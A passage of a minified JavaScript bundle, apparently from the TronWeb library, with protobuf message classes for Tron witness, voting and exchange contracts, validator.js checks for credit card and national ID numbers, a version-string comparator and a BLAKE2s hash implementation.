            TronWebProto.WitnessCreateContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.WitnessCreateContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.WitnessCreateContract.displayName = "TronWebProto.WitnessCreateContract"),
            TronWebProto.WitnessUpdateContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.WitnessUpdateContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.WitnessUpdateContract.displayName = "TronWebProto.WitnessUpdateContract"),
            TronWebProto.VoteWitnessContract = function(e) {
                n.Message.initialize(this, e, 0, -1, TronWebProto.VoteWitnessContract.repeatedFields_, null)
            }
            ,
            o.inherits(TronWebProto.VoteWitnessContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.VoteWitnessContract.displayName = "TronWebProto.VoteWitnessContract"),
            TronWebProto.VoteWitnessContract.Vote = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.VoteWitnessContract.Vote, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.VoteWitnessContract.Vote.displayName = "TronWebProto.VoteWitnessContract.Vote"),
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.WitnessCreateContract.prototype.toObject = function(e) {
                return TronWebProto.WitnessCreateContract.toObject(e, this)
            }
            ,
            TronWebProto.WitnessCreateContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    url: t.getUrl_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.WitnessCreateContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.WitnessCreateContract;
                return TronWebProto.WitnessCreateContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.WitnessCreateContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setUrl(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.WitnessCreateContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.WitnessCreateContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getUrl_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.getUrl = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.getUrl_asB64 = function() {
                return n.Message.bytesAsB64(this.getUrl())
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.getUrl_asU8 = function() {
                return n.Message.bytesAsU8(this.getUrl())
            }
            ,
            TronWebProto.WitnessCreateContract.prototype.setUrl = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.WitnessUpdateContract.prototype.toObject = function(e) {
                return TronWebProto.WitnessUpdateContract.toObject(e, this)
            }
            ,
            TronWebProto.WitnessUpdateContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    updateUrl: t.getUpdateUrl_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.WitnessUpdateContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.WitnessUpdateContract;
                return TronWebProto.WitnessUpdateContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.WitnessUpdateContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 12:
                        r = t.readBytes();
                        e.setUpdateUrl(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.WitnessUpdateContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.WitnessUpdateContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getUpdateUrl_asU8()).length > 0 && t.writeBytes(12, r)
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.getUpdateUrl = function() {
                return n.Message.getFieldWithDefault(this, 12, "")
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.getUpdateUrl_asB64 = function() {
                return n.Message.bytesAsB64(this.getUpdateUrl())
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.getUpdateUrl_asU8 = function() {
                return n.Message.bytesAsU8(this.getUpdateUrl())
            }
            ,
            TronWebProto.WitnessUpdateContract.prototype.setUpdateUrl = function(e) {
                return n.Message.setProto3BytesField(this, 12, e)
            }
            ,
            TronWebProto.VoteWitnessContract.repeatedFields_ = [2],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.VoteWitnessContract.prototype.toObject = function(e) {
                return TronWebProto.VoteWitnessContract.toObject(e, this)
            }
            ,
            TronWebProto.VoteWitnessContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    votesList: n.Message.toObjectList(t.getVotesList(), TronWebProto.VoteWitnessContract.Vote.toObject, e),
                    support: n.Message.getBooleanFieldWithDefault(t, 3, !1)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.VoteWitnessContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.VoteWitnessContract;
                return TronWebProto.VoteWitnessContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.VoteWitnessContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = new TronWebProto.VoteWitnessContract.Vote;
                        t.readMessage(r, TronWebProto.VoteWitnessContract.Vote.deserializeBinaryFromReader),
                        e.addVotes(r);
                        break;
                    case 3:
                        r = t.readBool();
                        e.setSupport(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.VoteWitnessContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.VoteWitnessContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getVotesList()).length > 0 && t.writeRepeatedMessage(2, r, TronWebProto.VoteWitnessContract.Vote.serializeBinaryToWriter),
                (r = e.getSupport()) && t.writeBool(3, r)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.VoteWitnessContract.Vote.prototype.toObject = function(e) {
                return TronWebProto.VoteWitnessContract.Vote.toObject(e, this)
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.toObject = function(e, t) {
                var r = {
                    voteAddress: t.getVoteAddress_asB64(),
                    voteCount: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.VoteWitnessContract.Vote.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.VoteWitnessContract.Vote;
                return TronWebProto.VoteWitnessContract.Vote.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setVoteAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setVoteCount(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.VoteWitnessContract.Vote.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getVoteAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getVoteCount()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.getVoteAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.getVoteAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getVoteAddress())
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.getVoteAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getVoteAddress())
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.setVoteAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.getVoteCount = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.VoteWitnessContract.Vote.prototype.setVoteCount = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.getVotesList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.VoteWitnessContract.Vote, 2)
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.setVotesList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 2, e)
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.addVotes = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 2, e, TronWebProto.VoteWitnessContract.Vote, t)
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.clearVotesList = function() {
                return this.setVotesList([])
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.getSupport = function() {
                return n.Message.getBooleanFieldWithDefault(this, 3, !1)
            }
            ,
            TronWebProto.VoteWitnessContract.prototype.setSupport = function(e) {
                return n.Message.setProto3BooleanField(this, 3, e)
            }
            ,
            o.object.extend(t, TronWebProto)
        }
        ,
        2903: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                (0,
                n.default)(e);
                var r = t.provider
                  , i = e.replace(/[- ]+/g, "");
                if (r && r.toLowerCase()in s) {
                    if (!s[r.toLowerCase()].test(i))
                        return !1
                } else {
                    if (r && !(r.toLowerCase()in s))
                        throw new Error("".concat(r, " is not a valid credit card provider."));
                    if (!a.some((function(e) {
                        return e.test(i)
                    }
                    )))
                        return !1
                }
                return (0,
                o.default)(e)
            }
            ;
            var n = i(r(8804))
              , o = i(r(9700));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = {
                amex: /^3[47][0-9]{13}$/,
                dinersclub: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
                discover: /^6(?:011|5[0-9][0-9])[0-9]{12,15}$/,
                jcb: /^(?:2131|1800|35\d{3})\d{11}$/,
                mastercard: /^5[1-5][0-9]{2}|(222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/,
                unionpay: /^(6[27][0-9]{14}|^(81[0-9]{14,17}))$/,
                visa: /^(?:4[0-9]{12})(?:[0-9]{3,6})?$/
            }
              , a = function() {
                var e = [];
                for (var t in s)
                    s.hasOwnProperty(t) && e.push(s[t]);
                return e
            }();
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        2970: (e, t) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = void 0;
            t.default = function(e, t) {
                return e.some((function(e) {
                    return t === e
                }
                ))
            }
            ;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        2972: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                n.default)(e),
                t in s)
                    return s[t](e);
                if ("any" === t) {
                    for (var r in s) {
                        if (s.hasOwnProperty(r))
                            if ((0,
                            s[r])(e))
                                return !0
                    }
                    return !1
                }
                throw new Error("Invalid locale '".concat(t, "'"))
            }
            ;
            var n = i(r(8804))
              , o = i(r(755));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = {
                PL: function(e) {
                    (0,
                    n.default)(e);
                    var t = {
                        1: 1,
                        2: 3,
                        3: 7,
                        4: 9,
                        5: 1,
                        6: 3,
                        7: 7,
                        8: 9,
                        9: 1,
                        10: 3,
                        11: 0
                    };
                    if (null != e && 11 === e.length && (0,
                    o.default)(e, {
                        allow_leading_zeroes: !0
                    })) {
                        var r = e.split("").slice(0, -1).reduce((function(e, r, n) {
                            return e + Number(r) * t[n + 1]
                        }
                        ), 0) % 10
                          , i = Number(e.charAt(e.length - 1));
                        if (0 === r && 0 === i || i === 10 - r)
                            return !0
                    }
                    return !1
                },
                ES: function(e) {
                    (0,
                    n.default)(e);
                    var t = {
                        X: 0,
                        Y: 1,
                        Z: 2
                    }
                      , r = e.trim().toUpperCase();
                    if (!/^[0-9X-Z][0-9]{7}[TRWAGMYFPDXBNJZSQVHLCKE]$/.test(r))
                        return !1;
                    var o = r.slice(0, -1).replace(/[X,Y,Z]/g, (function(e) {
                        return t[e]
                    }
                    ));
                    return r.endsWith(["T", "R", "W", "A", "G", "M", "Y", "F", "P", "D", "X", "B", "N", "J", "Z", "S", "Q", "V", "H", "L", "C", "K", "E"][o % 23])
                },
                FI: function(e) {
                    if ((0,
                    n.default)(e),
                    11 !== e.length)
                        return !1;
                    if (!e.match(/^\d{6}[\-A\+]\d{3}[0-9ABCDEFHJKLMNPRSTUVWXY]{1}$/))
                        return !1;
                    return "0123456789ABCDEFHJKLMNPRSTUVWXY"[(1e3 * parseInt(e.slice(0, 6), 10) + parseInt(e.slice(7, 10), 10)) % 31] === e.slice(10, 11)
                },
                IN: function(e) {
                    var t = [[0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 2, 3, 4, 0, 6, 7, 8, 9, 5], [2, 3, 4, 0, 1, 7, 8, 9, 5, 6], [3, 4, 0, 1, 2, 8, 9, 5, 6, 7], [4, 0, 1, 2, 3, 9, 5, 6, 7, 8], [5, 9, 8, 7, 6, 0, 4, 3, 2, 1], [6, 5, 9, 8, 7, 1, 0, 4, 3, 2], [7, 6, 5, 9, 8, 2, 1, 0, 4, 3], [8, 7, 6, 5, 9, 3, 2, 1, 0, 4], [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]]
                      , r = [[0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 5, 7, 6, 2, 8, 3, 0, 9, 4], [5, 8, 0, 3, 7, 9, 6, 1, 4, 2], [8, 9, 1, 6, 0, 4, 3, 5, 2, 7], [9, 4, 5, 3, 1, 2, 6, 8, 7, 0], [4, 2, 8, 6, 5, 7, 3, 9, 0, 1], [2, 7, 9, 3, 8, 0, 6, 4, 1, 5], [7, 0, 4, 6, 9, 1, 3, 2, 5, 8]]
                      , n = e.trim();
                    if (!/^[1-9]\d{3}\s?\d{4}\s?\d{4}$/.test(n))
                        return !1;
                    var o = 0;
                    return n.replace(/\s/g, "").split("").map(Number).reverse().forEach((function(e, n) {
                        o = t[o][r[n % 8][e]]
                    }
                    )),
                    0 === o
                },
                IR: function(e) {
                    if (!e.match(/^\d{10}$/))
                        return !1;
                    if (e = "0000".concat(e).slice(e.length - 6),
                    0 === parseInt(e.slice(3, 9), 10))
                        return !1;
                    for (var t = parseInt(e.slice(9, 10), 10), r = 0, n = 0; n < 9; n++)
                        r += parseInt(e.slice(n, n + 1), 10) * (10 - n);
                    return (r %= 11) < 2 && t === r || r >= 2 && t === 11 - r
                },
                IT: function(e) {
                    return 9 === e.length && ("CA00000AA" !== e && e.search(/C[A-Z]\d{5}[A-Z]{2}/i) > -1)
                },
                NO: function(e) {
                    var t = e.trim();
                    if (isNaN(Number(t)))
                        return !1;
                    if (11 !== t.length)
                        return !1;
                    if ("00000000000" === t)
                        return !1;
                    var r = t.split("").map(Number)
                      , n = (11 - (3 * r[0] + 7 * r[1] + 6 * r[2] + 1 * r[3] + 8 * r[4] + 9 * r[5] + 4 * r[6] + 5 * r[7] + 2 * r[8]) % 11) % 11
                      , o = (11 - (5 * r[0] + 4 * r[1] + 3 * r[2] + 2 * r[3] + 7 * r[4] + 6 * r[5] + 5 * r[6] + 4 * r[7] + 3 * r[8] + 2 * n) % 11) % 11;
                    return n === r[9] && o === r[10]
                },
                TH: function(e) {
                    if (!e.match(/^[1-8]\d{12}$/))
                        return !1;
                    for (var t = 0, r = 0; r < 12; r++)
                        t += parseInt(e[r], 10) * (13 - r);
                    return e[12] === ((11 - t % 11) % 10).toString()
                },
                LK: function(e) {
                    return !(10 !== e.length || !/^[1-9]\d{8}[vx]$/i.test(e)) || !(12 !== e.length || !/^[1-9]\d{11}$/i.test(e))
                },
                "he-IL": function(e) {
                    var t = e.trim();
                    if (!/^\d{9}$/.test(t))
                        return !1;
                    for (var r, n = t, o = 0, i = 0; i < n.length; i++)
                        o += (r = Number(n[i]) * (i % 2 + 1)) > 9 ? r - 9 : r;
                    return o % 10 === 0
                },
                "ar-LY": function(e) {
                    var t = e.trim();
                    return !!/^(1|2)\d{11}$/.test(t)
                },
                "ar-TN": function(e) {
                    var t = e.trim();
                    return !!/^\d{8}$/.test(t)
                },
                "zh-CN": function(e) {
                    var t, r = ["11", "12", "13", "14", "15", "21", "22", "23", "31", "32", "33", "34", "35", "36", "37", "41", "42", "43", "44", "45", "46", "50", "51", "52", "53", "54", "61", "62", "63", "64", "65", "71", "81", "82", "91"], n = ["7", "9", "10", "5", "8", "4", "2", "1", "6", "3", "7", "9", "10", "5", "8", "4", "2"], o = ["1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2"], i = function(e) {
                        return r.includes(e)
                    }, s = function(e) {
                        var t = parseInt(e.substring(0, 4), 10)
                          , r = parseInt(e.substring(4, 6), 10)
                          , n = parseInt(e.substring(6), 10)
                          , o = new Date(t,r - 1,n);
                        return !(o > new Date) && (o.getFullYear() === t && o.getMonth() === r - 1 && o.getDate() === n)
                    }, a = function(e) {
                        return function(e) {
                            for (var t = e.substring(0, 17), r = 0, i = 0; i < 17; i++)
                                r += parseInt(t.charAt(i), 10) * parseInt(n[i], 10);
                            return o[r % 11]
                        }(e) === e.charAt(17).toUpperCase()
                    };
                    return !!/^\d{15}|(\d{17}(\d|x|X))$/.test(t = e) && (15 === t.length ? function(e) {
                        var t = /^[1-9]\d{7}((0[1-9])|(1[0-2]))((0[1-9])|([1-2][0-9])|(3[0-1]))\d{3}$/.test(e);
                        if (!t)
                            return !1;
                        var r = e.substring(0, 2);
                        if (!(t = i(r)))
                            return !1;
                        var n = "19".concat(e.substring(6, 12));
                        return !!(t = s(n))
                    }(t) : function(e) {
                        var t = /^[1-9]\d{5}[1-9]\d{3}((0[1-9])|(1[0-2]))((0[1-9])|([1-2][0-9])|(3[0-1]))\d{3}(\d|x|X)$/.test(e);
                        if (!t)
                            return !1;
                        var r = e.substring(0, 2);
                        if (!(t = i(r)))
                            return !1;
                        var n = e.substring(6, 14);
                        return !!(t = s(n)) && a(e)
                    }(t))
                },
                "zh-HK": function(e) {
                    var t = /^[0-9]$/;
                    if (e = (e = e.trim()).toUpperCase(),
                    !/^[A-Z]{1,2}[0-9]{6}((\([0-9A]\))|(\[[0-9A]\])|([0-9A]))$/.test(e))
                        return !1;
                    8 === (e = e.replace(/\[|\]|\(|\)/g, "")).length && (e = "3".concat(e));
                    for (var r = 0, n = 0; n <= 7; n++) {
                        r += (t.test(e[n]) ? e[n] : (e[n].charCodeAt(0) - 55) % 11) * (9 - n)
                    }
                    return (0 === (r %= 11) ? "0" : 1 === r ? "A" : String(11 - r)) === e[e.length - 1]
                },
                "zh-TW": function(e) {
                    var t = {
                        A: 10,
                        B: 11,
                        C: 12,
                        D: 13,
                        E: 14,
                        F: 15,
                        G: 16,
                        H: 17,
                        I: 34,
                        J: 18,
                        K: 19,
                        L: 20,
                        M: 21,
                        N: 22,
                        O: 35,
                        P: 23,
                        Q: 24,
                        R: 25,
                        S: 26,
                        T: 27,
                        U: 28,
                        V: 29,
                        W: 32,
                        X: 30,
                        Y: 31,
                        Z: 33
                    }
                      , r = e.trim().toUpperCase();
                    return !!/^[A-Z][0-9]{9}$/.test(r) && Array.from(r).reduce((function(e, r, n) {
                        if (0 === n) {
                            var o = t[r];
                            return o % 10 * 9 + Math.floor(o / 10)
                        }
                        return 9 === n ? (10 - e % 10 - Number(r)) % 10 === 0 : e + Number(r) * (9 - n)
                    }
                    ), 0)
                }
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3029: e => {
            const t = /^[0-9]+$/
              , r = (e, r) => {
                const n = t.test(e)
                  , o = t.test(r);
                return n && o && (e = +e,
                r = +r),
                e === r ? 0 : n && !o ? -1 : o && !n ? 1 : e < r ? -1 : 1
            }
            ;
            e.exports = {
                compareIdentifiers: r,
                rcompareIdentifiers: (e, t) => r(t, e)
            }
        }
        ,
        3048: (e, t, r) => {
            const n = r(5288);
            function o(e, t) {
                return e[t] ^ e[t + 1] << 8 ^ e[t + 2] << 16 ^ e[t + 3] << 24
            }
            function i(e, t, r, n, o, i) {
                l[e] = l[e] + l[t] + o,
                l[n] = s(l[n] ^ l[e], 16),
                l[r] = l[r] + l[n],
                l[t] = s(l[t] ^ l[r], 12),
                l[e] = l[e] + l[t] + i,
                l[n] = s(l[n] ^ l[e], 8),
                l[r] = l[r] + l[n],
                l[t] = s(l[t] ^ l[r], 7)
            }
            function s(e, t) {
                return e >>> t ^ e << 32 - t
            }
            const a = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
              , c = new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9, 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11, 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10, 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5, 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0])
              , l = new Uint32Array(16)
              , u = new Uint32Array(16);
            function d(e, t) {
                let r = 0;
                for (r = 0; r < 8; r++)
                    l[r] = e.h[r],
                    l[r + 8] = a[r];
                for (l[12] ^= e.t,
                l[13] ^= e.t / 4294967296,
                t && (l[14] = ~l[14]),
                r = 0; r < 16; r++)
                    u[r] = o(e.b, 4 * r);
                for (r = 0; r < 10; r++)
                    i(0, 4, 8, 12, u[c[16 * r + 0]], u[c[16 * r + 1]]),
                    i(1, 5, 9, 13, u[c[16 * r + 2]], u[c[16 * r + 3]]),
                    i(2, 6, 10, 14, u[c[16 * r + 4]], u[c[16 * r + 5]]),
                    i(3, 7, 11, 15, u[c[16 * r + 6]], u[c[16 * r + 7]]),
                    i(0, 5, 10, 15, u[c[16 * r + 8]], u[c[16 * r + 9]]),
                    i(1, 6, 11, 12, u[c[16 * r + 10]], u[c[16 * r + 11]]),
                    i(2, 7, 8, 13, u[c[16 * r + 12]], u[c[16 * r + 13]]),
                    i(3, 4, 9, 14, u[c[16 * r + 14]], u[c[16 * r + 15]]);
                for (r = 0; r < 8; r++)
                    e.h[r] ^= l[r] ^ l[r + 8]
            }
            function h(e, t) {
                if (!(e > 0 && e <= 32))
                    throw new Error("Incorrect output length, should be in [1, 32]");
                const r = t ? t.length : 0;
                if (t && !(r > 0 && r <= 32))
                    throw new Error("Incorrect key length, should be in [1, 32]");
                const n = {
                    h: new Uint32Array(a),
                    b: new Uint8Array(64),
                    c: 0,
                    t: 0,
                    outlen: e
                };
                return n.h[0] ^= 16842752 ^ r << 8 ^ e,
                r > 0 && (f(n, t),
                n.c = 64),
                n
            }
            function f(e, t) {
                for (let r = 0; r < t.length; r++)
                    64 === e.c && (e.t += e.c,
                    d(e, !1),
                    e.c = 0),
                    e.b[e.c++] = t[r]
            }
            function p(e) {
                for (e.t += e.c; e.c < 64; )
                    e.b[e.c++] = 0;
                d(e, !0);
                const t = new Uint8Array(e.outlen);
                for (let r = 0; r < e.outlen; r++)
                    t[r] = e.h[r >> 2] >> 8 * (3 & r) & 255;
                return t
            }
            function g(e, t, r) {
                r = r || 32,
                e = n.normalizeInput(e);
                const o = h(r, t);
                return f(o, e),
                p(o)
            }
            e.exports = {
                blake2s: g,
                blake2sHex: function(e, t, r) {
                    const o = g(e, t, r);
                    return n.toHex(o)
                },
                blake2sInit: h,
                blake2sUpdate: f,
                blake2sFinal: p
            }
        }
        ,
        3058: (e, t, r) => {
            var n = r(7248)
              , o = n
              , i = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof i && i || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")();
            o.exportSymbol("TronWebProto.ExchangeCreateContract", null, i),
            o.exportSymbol("TronWebProto.ExchangeInjectContract", null, i),
            o.exportSymbol("TronWebProto.ExchangeTransactionContract", null, i),
            o.exportSymbol("TronWebProto.ExchangeWithdrawContract", null, i),
            TronWebProto.ExchangeCreateContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.ExchangeCreateContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.ExchangeCreateContract.displayName = "TronWebProto.ExchangeCreateContract"),
            TronWebProto.ExchangeInjectContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.ExchangeInjectContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.ExchangeInjectContract.displayName = "TronWebProto.ExchangeInjectContract"),
            TronWebProto.ExchangeWithdrawContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.ExchangeWithdrawContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.ExchangeWithdrawContract.displayName = "TronWebProto.ExchangeWithdrawContract"),
            TronWebProto.ExchangeTransactionContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.ExchangeTransactionContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.ExchangeTransactionContract.displayName = "TronWebProto.ExchangeTransactionContract"),
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeCreateContract.prototype.toObject = function(e) {
                return TronWebProto.ExchangeCreateContract.toObject(e, this)
            }
            ,
            TronWebProto.ExchangeCreateContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    firstTokenId: t.getFirstTokenId_asB64(),
                    firstTokenBalance: n.Message.getFieldWithDefault(t, 3, 0),
                    secondTokenId: t.getSecondTokenId_asB64(),
                    secondTokenBalance: n.Message.getFieldWithDefault(t, 5, 0)
                };
